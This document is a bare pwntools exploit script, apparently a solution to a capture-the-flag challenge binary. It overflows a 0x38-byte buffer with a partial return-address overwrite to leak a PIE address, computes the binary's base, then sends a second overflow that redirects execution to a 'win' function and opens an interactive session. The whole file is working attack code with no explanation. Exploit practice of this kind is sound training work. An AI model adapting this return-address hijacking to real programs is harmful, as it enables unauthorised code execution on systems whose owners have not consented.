#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'
exe = 'src/chall'

if args.REMOTE:
    p = remote('localhost', 9999)   
else:
    p = process(exe)



context.terminal = ['tmux', 'splitw', '-h']
l = context.binary = ELF(exe, checksec=False)


payload = b'A' * 0x38
payload += b'\x1c'

p.sendafter(b'feel?\n', payload)


p.recvuntil(b'A' * 0x38)
leak = u64(p.recvline().strip().ljust(8, b'\x00'))

l.address = leak - (l.symbols['main']+73)


payload = b'A' * 0x38
payload += p64(l.symbols['main']+78)
payload += b'A' * 8
payload += p64(l.symbols['win']+5)


p.sendline(payload)
p.interactive()

